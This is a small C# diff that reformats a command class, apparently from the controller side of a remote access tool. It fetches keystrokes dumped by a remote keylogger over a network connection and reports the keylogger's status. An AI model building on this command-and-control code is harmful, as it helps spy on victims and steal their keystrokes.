@@ -1,7 +1,7 @@
-﻿using System;
-using System.Collections.Generic;
-using Master.AdvancedConsole;
+﻿using Master.AdvancedConsole;
 using Master.Commands.Core;
+using System;
+using System.Collections.Generic;
 
 namespace Master.Commands
 {
@@ -21,19 +21,18 @@ namespace Master.Commands
             "status"
         };
 
-
         public void Process(List<string> args)
         {
             var result = MasterCommandsManager.networkManager.ReadLine();
 
             if (args[0] == "dump")
             {
-                if(result != "") Console.WriteLine(result);
+                if (result != "") Console.WriteLine(result);
             }
             else
             {
                 Console.Write("Keylogger status : [");
-                if(result == "on")
+                if (result == "on")
                     ColorTools.WriteInlineMessage("ON", ConsoleColor.Cyan);
                 else
                     ColorTools.WriteInlineMessage("OFF", ConsoleColor.Red);
